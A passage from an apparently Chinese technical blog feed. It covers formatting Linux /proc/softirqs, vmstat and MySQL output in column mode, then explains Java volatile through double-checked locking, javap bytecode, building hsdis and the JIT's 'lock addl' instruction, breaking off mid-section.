   3679        537      11125</span><br><span class="line">      NET_RX:   54739232  104971608     175092     144098     287613     181637     274003     105699  137866529   37821843     114651       5258   31830654   74227300     149144      41791      32428      12501  136630455      80495   49754625     158541   30734583       3512       2284       2796   35459431  131330367      78501   89945954      50223  117038378</span><br><span class="line">       BLOCK:      81587     139726     179707     144663     159758     190601     132768     276230      72676     287984     130253     323938     152578     206060     141233     141074     193578     251093        448     131136      62687     150827     194672     388017      81603     163935     175096     166935     330730      47293     161579      54246</span><br><span class="line">BLOCK_IOPOLL:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0</span><br><span class="line">     TASKLET:    1675397    3309130       9569       4022       2764       5093       4897      10826    4444030    1454707       1496        286    1048531    2576975        811       2119        442        417    4300523        260    1552321        418    1015839      10748        510        218    1121876    4256900        115    3020283        287    3986726</span><br><span class="line">       SCHED:   15007043   12859515   11501051   11259112   10939612   10774900   10462556   10131094   14234569   10072702    9984370   10190600   11242845   12149746    9940021   10177032    6683735    7652871   10904532    7456442    9226435    7306446    8605291    6707082    6480350    7086698    8286905   11682767    7195542    8529887    7447246   10396247</span><br><span class="line">     HRTIMER:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0</span><br><span class="line">         RCU:   17206657   17427121   18015842   17756453   17731002   17874141   17772044   17467329   18480130   17666877   17975799   18291442   18971854   19696035   18311040   18486331   14653377   16665048   16695739   15810275   15832142   14999192   15912229   14669770   14782425   16825467   16554916   18592285   15670613   15416856   16010390   16910501</span><br></pre></td></tr></table></figure>
<p>wtf!!!</p>
<p>这时候就需要结合cut来发挥作用了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c -160</span><br><span class="line">CPU0           CPU1      CPU2       CPU3      CPU4      CPU5      CPU6      CPU7      CPU8      CPU9       CPU10     CPU11     CPU12     CPU13     CPU14     CPU</span><br><span class="line">HI:            0         0          0         0         0         0         0         0         0          0         0         0         0         0         6  </span><br><span class="line">TIMER:         42897374  44265424   43773013  42294893  42872190  42703730  42422299  41715918  48651925   43219235  43155865  43751531  46455390  48993651  434</span><br><span class="line">NET_TX:        158851    57164      981       939       1119      956       882       894       53297      43884     904       980       5551      31451     917</span><br><span class="line">NET_RX:        54266774  104535675  175086    144094    287558    181540    273997    105609    137397792  37471099  114548    5252      31830477  74227296  149</span><br><span class="line">BLOCK:         81585     139726     179707    144265    159758    190245    132562    275983    72656      287710    130180    323916    152544    205625    140</span><br><span class="line">BLOCK_IOPOLL:  0         0          0         0         0         0         0         0         0          0         0         0         0         0         0  </span><br><span class="line">TASKLET:       1661705   3295175    9569      4022      2764      5093      4897      10826     4429925    1442145   1496      286       1048531   2576975   811</span><br><span class="line">SCHED:         14954535  12813884   11459036  11217505  10901019  10736479  10424577  10093709  14202602   10037804  9955899   10162495  11215015  12123529  991</span><br><span class="line">HRTIMER:       0         0          0         0         0         0         0         0         0          0         0         0         0         0         0  </span><br><span class="line">RCU:           17145747  17366996   17952484  17693839  17671645  17814624  17709279  17405994  18416537   17600989  17910864  18226002  18906471  19629970  182</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c 150-300</span><br><span class="line">U14     CPU15     CPU16     CPU17     CPU18     CPU19      CPU20     CPU21     CPU22     CPU23     CPU24     CPU25     CPU26     CPU27     CPU28      C</span><br><span class="line">        6         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">030995  43485667  44493659  36326549  40157402  43631283   38151873  40219806  36756938  40144515  36283732  37161284  40199408  40717545  48006972   3</span><br><span class="line">451     917       925       601       662       58258      560       4373      614       16262     532       656       572       15544     23806      5</span><br><span class="line">227296  149142    41791     32391     12499     136276000  80492     49754624  158467    30734581  3506      2281      2795      35459426  131010842  7</span><br><span class="line">5644    140738    141074    192744    251010    448        130632    62646     150826    193938    387975    81598     163807    174560    166894     3</span><br><span class="line">        0         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">76975   811       2119      442       417       4290461    260       1552321   418       1015839   10748     510       218       1121876   4247160    1</span><br><span class="line">130763  9918727   10155044  6665114   7634478   10872508   7435459   9208357   7287842   8584087   6687254   6464581   7069601   8268941   11657561   7</span><br><span class="line">        0         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">645462  18260707  18436150  14614558  16626358  16648198   15772191  15794569  14960694  15874249  14631009  14737925  16781205  16511913  18544088   1</span><br><span class="line"></span><br><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c 290-</span><br><span class="line">PU28      CPU29     CPU30     CPU31</span><br><span class="line">          0         0         1         0</span><br><span class="line">8025761   38667794  40583340  39575602  44506422</span><br><span class="line">3810      555       3672      535       11121</span><br><span class="line">31059150  78501     89665808  50166     116771524</span><br><span class="line">66900     330730    47290     161396    54232</span><br><span class="line">          0         0         0         0</span><br><span class="line">248714    115       3012042   287       3978676</span><br><span class="line">1661902   7180114   8511025   7432308   10374288</span><br><span class="line">          0         0         0         0</span><br><span class="line">8550398   15634808  15373695  15974460  16871666</span><br></pre></td></tr></table></figure>
<p>整整齐齐才好看啊!<br>唉, <code>cpu</code>太多也是麻烦啊</p>
<h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><p>今天在<code>性能之巅</code>发现, <code>vmstat</code>支持列模式, <code>-s</code>可以按照列输出, <code>-Sm</code>修改输出的单位为<code>m</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat -asSm 1 </span><br><span class="line">        12500 m total memory</span><br><span class="line">         4053 m used memory</span><br><span class="line">         5919 m active memory</span><br><span class="line">         1883 m inactive memory</span><br><span class="line">         3940 m free memory</span><br><span class="line">          760 m buffer memory</span><br><span class="line">         3745 m swap cache</span><br><span class="line">         4294 m total swap</span><br><span class="line">            0 m used swap</span><br><span class="line">         4294 m free swap</span><br><span class="line">       606762 non-nice user cpu ticks</span><br><span class="line">         3887 nice user cpu ticks</span><br><span class="line">       140316 system cpu ticks</span><br><span class="line">      8108433 idle cpu ticks</span><br><span class="line">        91538 IO-wait cpu ticks</span><br><span class="line">            0 IRQ cpu ticks</span><br><span class="line">         3461 softirq cpu ticks</span><br><span class="line">            0 stolen cpu ticks</span><br><span class="line">      2775187 pages paged in</span><br><span class="line">      3731660 pages paged out</span><br><span class="line">            0 pages swapped in</span><br><span class="line">            0 pages swapped out</span><br><span class="line">     16443967 interrupts</span><br><span class="line">     81534611 CPU context switches</span><br><span class="line">   1532129612 boot time</span><br><span class="line">        39867 forks</span><br></pre></td></tr></table></figure>
<p>mysql也有对应的列模式:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *  from hotel_order_simple limit 1;</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">| id   | uid             | order_no     | user_name   | contact_phone | card_index | create_date         | order_type | user_status | terminal | room_type | region_type | update_time         |</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">| 1109 | 66666666666666 | 66666666666666 | 66666666666666 | 66666666666666   |            | 2018-06-03 11:12:14 | 1005001    |      100070 | app      |         0 |           1 | 2018-06-04 20:09:56 |</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">// 列模式</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from hotel_order_simple limit 1 \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1109</span><br><span class="line">          uid: 66666666666666</span><br><span class="line">     order_no: 66666666666666</span><br><span class="line">    user_name: 66666666666666</span><br><span class="line">contact_phone: 66666666666666</span><br><span class="line">   card_index: </span><br><span class="line">  create_date: 2018-06-03 11:12:14</span><br><span class="line">   order_type: 1005001</span><br><span class="line">  user_status: 100070</span><br><span class="line">     terminal: app</span><br><span class="line">    room_type: 0</span><br><span class="line">  region_type: 1</span><br><span class="line">  update_time: 2018-06-04 20:09:56</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br></pre></td></tr></table></figure>
<p>所以, 有的时候多看看手册也不错.</p>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> format </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[volatile]]></title>
      <url>http://qsli.github.io/2018/07/08/volatile/</url>
      <content type="html"><![CDATA[<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>volatile的作用:</p>
<p>1.保证多个线程”同时”修改”共享”变量时不会因为cpu cache等原因而造成不一致,  </p>
<p>2.另外的作用就是防止指令重排</p>
<h2 id="防止指令重排"><a href="#防止指令重排" class="headerlink" title="防止指令重排"></a>防止指令重排</h2><p><code>Double-Checked Locking</code>中实例必须可以通过加上<code>volatile</code>关键字来防止防止指令重排产生的影响.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Works with acquire/release semantics for volatile</span></span><br><span class="line"><span class="comment">// Broken under current semantics for volatile</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 注意必须是volatile</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">volatile</span> Helper helper = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Helper <span class="title">getHelper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (helper == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (helper == <span class="keyword">null</span>)</span><br><span class="line">                        helper = <span class="keyword">new</span> Helper();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> helper;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>查看编译后的字节码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">➜  jvm  javap -v -p  Foo</span><br><span class="line">Classfile /home/qishengli/test/jvm/Foo.class</span><br><span class="line">  Last modified Jul 8, 2018; size 521 bytes</span><br><span class="line">  MD5 checksum 1bacc25f9d4c0bf1b0b5c0f46172767f</span><br><span class="line">  Compiled from &quot;Foo.java&quot;</span><br><span class="line">class Foo</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref          #6.#22         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Fieldref           #5.#23         // Foo.helper:LFoo$Helper;</span><br><span class="line">   #3 = Class              #24            // Foo$Helper</span><br><span class="line">   #4 = Methodref          #3.#25         // Foo$Helper.&quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">   #5 = Class              #26            // Foo</span><br><span class="line">   #6 = Class              #27            // java/lang/Object</span><br><span class="line">   #7 = Utf8               Helper</span><br><span class="line">   #8 = Utf8               InnerClasses</span><br><span class="line">   #9 = Utf8               helper</span><br><span class="line">  #10 = Utf8               LFoo$Helper;</span><br><span class="line">  #11 = Utf8               &lt;init&gt;</span><br><span class="line">  #12 = Utf8               ()V</span><br><span class="line">  #13 = Utf8               Code</span><br><span class="line">  #14 = Utf8               LineNumberTable</span><br><span class="line">  #15 = Utf8               getHelper</span><br><span class="line">  #16 = Utf8               ()LFoo$Helper;</span><br><span class="line">  #17 = Utf8               StackMapTable</span><br><span class="line">  #18 = Class              #27            // java/lang/Object</span><br><span class="line">  #19 = Class              #28            // java/lang/Throwable</span><br><span class="line">  #20 = Utf8               SourceFile</span><br><span class="line">  #21 = Utf8               Foo.java</span><br><span class="line">  #22 = NameAndType        #11:#12        // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #23 = NameAndType        #9:#10         // helper:LFoo$Helper;</span><br><span class="line">  #24 = Utf8               Foo$Helper</span><br><span class="line">  #25 = NameAndType        #11:#29        // &quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">  #26 = Utf8               Foo</span><br><span class="line">  #27 = Utf8               java/lang/Object</span><br><span class="line">  #28 = Utf8               java/lang/Throwable</span><br><span class="line">  #29 = Utf8               (LFoo;)V</span><br><span class="line">&#123;</span><br><span class="line">  private volatile Foo$Helper helper;</span><br><span class="line">    descriptor: LFoo$Helper;</span><br><span class="line">    flags: ACC_PRIVATE, ACC_VOLATILE</span><br><span class="line"></span><br><span class="line">  Foo();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags:</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: aload_0</span><br><span class="line">         5: aconst_null</span><br><span class="line">         6: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">         9: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 1: 0</span><br><span class="line">        line 2: 4</span><br><span class="line"></span><br><span class="line">  public Foo$Helper getHelper();</span><br><span class="line">    descriptor: ()LFoo$Helper;</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=4, locals=3, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">         4: ifnonnull     40</span><br><span class="line">         7: aload_0</span><br><span class="line">         8: dup</span><br><span class="line">         9: astore_1</span><br><span class="line">        10: monitorenter</span><br><span class="line">        11: aload_0</span><br><span class="line">        12: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        15: ifnonnull     30</span><br><span class="line">        18: aload_0</span><br><span class="line">        19: new           #3                  // class Foo$Helper</span><br><span class="line">        22: dup</span><br><span class="line">        23: aload_0</span><br><span class="line">        24: invokespecial #4                  // Method Foo$Helper.&quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">        27: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        30: aload_1</span><br><span class="line">        31: monitorexit</span><br><span class="line">        32: goto          40</span><br><span class="line">        35: astore_2</span><br><span class="line">        36: aload_1</span><br><span class="line">        37: monitorexit</span><br><span class="line">        38: aload_2</span><br><span class="line">        39: athrow</span><br><span class="line">        40: aload_0</span><br><span class="line">        41: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        44: areturn</span><br><span class="line">      Exception table:</span><br><span class="line">         from    to  target type</span><br><span class="line">            11    32    35   any</span><br><span class="line">            35    38    35   any</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 4: 0</span><br><span class="line">        line 5: 7</span><br><span class="line">        line 6: 11</span><br><span class="line">        line 7: 18</span><br><span class="line">        line 9: 30</span><br><span class="line">        line 11: 40</span><br><span class="line">      StackMapTable: number_of_entries = 3</span><br><span class="line">        frame_type = 252 /* append */</span><br><span class="line">          offset_delta = 30</span><br><span class="line">          locals = [ class java/lang/Object ]</span><br><span class="line">        frame_type = 68 /* same_locals_1_stack_item */</span><br><span class="line">          stack = [ class java/lang/Throwable ]</span><br><span class="line">        frame_type = 250 /* chop */</span><br><span class="line">          offset_delta = 4</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;Foo.java&quot;</span><br><span class="line">InnerClasses:</span><br><span class="line">     #7= #3 of #5; //Helper=class Foo$Helper of class Foo</span><br></pre></td></tr></table></figure>
<p>去掉<code>volatile</code>关键字, 后对比生成的字节码:</p>
<img src="/2018/07/08/volatile/diff.png" title="两次生成字节码的diff">
<p>可见只是多了一个访问的表示<code>ACC_VOLATILE</code></p>
<p>从<code>The Java® Virtual Machine Specification</code>中可以找到如下的说明:</p>
<blockquote>
<p>ACC_VOLATILE 0x0040 Declared volatile; cannot be cached;</p>
</blockquote>
<p>既然字节码层面找不到太多的蛛丝马迹, 我们来看看汇编的代码</p>
<h3 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h3><p>要查看汇编代码需要用到一个叫做<code>hsdis</code>(A HotSpot plugin for disassembling dynamically generated code.)的工具, 这个工具可以自己下载<code>openjdk</code>的代码编译, 也可以下载别人已经编译好的.</p>
<p><code>openjdk</code>中对应的源码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  jvm  locate hsdis         </span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/Makefile</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/README</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis-demo.c</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis.c</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis.h</span><br></pre></td></tr></table></figure>
<p>编译时需要下载<code>binutils-2.19.1</code>, 编译命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  hsdis  ls</span><br><span class="line">binutils-2.19.1  binutils-2.19.1.tar.bz2  build  hsdis.c  hsdis-demo.c  hsdis.h  Makefile  README</span><br><span class="line">➜  hsdis  sudo make BINUTILS=binutils-2.19.1 ARCH=amd64</span><br></pre></td></tr></table></figure>
<p>不过<code>binutils</code>的编译配置中, 如果用的是gcc编译会把所有的warning当作error, 可以看到config.log的输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc1: all warnings being treated as errors</span><br></pre></td></tr></table></figure></p>
<p>强行替换<code>-Werror</code>为’’:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &quot;包含-Werror的文件&quot; | xargs -I&#123;&#125; sudo sed -i &quot;s#-Werror##g&quot; &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>再编译就好了!</p>
<p>至于安装, 他的<code>README</code>中已经说的很清楚了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* Installing</span><br><span class="line"></span><br><span class="line">Products are named like build/$OS-$LIBARCH/hsdis-$LIBARCH.so.  You can</span><br><span class="line">install them on your LD_LIBRARY_PATH, or inside of your JRE/JDK.  The</span><br><span class="line">search path in the JVM is:</span><br><span class="line"></span><br><span class="line">1. &lt;home&gt;/jre/lib/&lt;arch&gt;/&lt;vm&gt;/libhsdis-&lt;arch&gt;.so</span><br><span class="line">2. &lt;home&gt;/jre/lib/&lt;arch&gt;/&lt;vm&gt;/hsdis-&lt;arch&gt;.so</span><br><span class="line">3. &lt;home&gt;/jre/lib/&lt;arch&gt;/hsdis-&lt;arch&gt;.so</span><br><span class="line">4. hsdis-&lt;arch&gt;.so  (using LD_LIBRARY_PATH)</span><br><span class="line"></span><br><span class="line">Note that there&apos;s a bug in hotspot versions prior to hs22 that causes</span><br><span class="line">steps 2 and 3 to fail when used with JDK7.</span><br><span class="line"></span><br><span class="line">Now test:</span><br><span class="line"></span><br><span class="line">  export LD_LIBRARY_PATH .../hsdis/build/$OS-$LIBARCH:$LD_LIBRARY_PATH</span><br><span class="line">  dargs=&apos;-XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly&apos;</span><br><span class="line">  dargs=$dargs&apos; -XX:PrintAssemblyOptions=hsdis-print-bytes&apos;</span><br><span class="line">  java $dargs -Xbatch CompileCommand=print,*String.hashCode HelloWorld</span><br><span class="line"></span><br><span class="line">If the product mode of the JVM does not accept -XX:+PrintAssembly,</span><br><span class="line">you do not have a version new enough to use the hsdis plugin.</span><br></pre></td></tr></table></figure>
<p>安装就是放到jvm能够加载到的路径上, 然后在jvm的启动参数中加入<code>-XX:+PrintAssembly -Xcomp</code></p>
<blockquote>
<p>参数-Xcomp是让虚拟机以编译模式执行代码，这样代码可以偷懒，不需要执行足够次数来预热都能触发JIT编译。</p>
</blockquote>
<p>可以看到输出:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 0x00007f29294c0054: mov    %r12d,0xc(%rbp)</span><br><span class="line"> 0x00007f29294c0058: lock addl $0x0,(%rsp)     ;*putfield helper</span><br><span class="line">                                               ; - com.air.jvm.VolatileTest$Foo::&lt;init&gt;@6 (line 40)</span><br><span class="line">//...</span><br><span class="line"> 0x00007f2929504fdc: shr    $0x9,%rax</span><br><span class="line"> 0x00007f2929504fe0: mov    $0x7f2924e3f000,%rdi</span><br><span class="line"> 0x00007f2929504fea: movb   $0x0,(%rax,%rdi,1)</span><br><span class="line"> 0x00007f2929504fee: lock addl $0x0,(%rsp)     ;*putfield helper</span><br><span class="line">                                               ; - com.air.jvm.VolatileTest$Foo::getHelper@27 (line 45)</span><br></pre></td></tr></table></figure>
<p>可以看到多出了一行 “lock addl $0x0,(%rsp)”，这行代码只是对 stack pointer 加 0，无含义。<br>但 LOCK prefix 的指令会触发处理器做特殊的操作，查看 Intel 64 and IA-32 架构开发手册的相关资料：</p>
<p>“Synchronization mechanisms in multiple-processor systems may depend upon a strong memory-ordering model. Here, a program can use a locking instruction such as the XCHG instruction or the LOCK prefix to ensure that a read-modify-write operation on memory is carried out atomically. Locking operations typically operate like I/O operations in that they wait for all previous instructions to complete and for all buffered writes to drain to memory.”</p>
<p>LOCK prefix 会触发 CPU 缓存回写到内存，而后通过 CPU 缓存一致性机制，使得其它线程能够看到最新的共享变量，实现了共享变量对于所有 CPU 的可见性。</p>
<img src="/2018/07/08/volatile/cpu-cache.jpg">
<h3 id="new-Test-做了什么"><a href="#new-Test-做了什么" class="headerlink" title="new Test()做了什么"></a><code>new Test()</code>做了什么</h3><p>参考R大在知乎上的解答:</p>
<blockquote>
<p><code>new Test()</code><br>这个表达式的作用是：</p>
<ol>
<li>创建并默认初始化一个Test类型的对象</li>
<li>调用Test类的signature为 <init>()V 的构造器</init></li>
<li>表达式的值为一个指向这个新建对家的引用。</li>
</ol>
</blockquote>
<p>对应到上面的字节码, 我们从同步块的<code>monitorenter</code>和<code>monitorexit</code>找到<code>new</code>对应的字节码如下:</p>
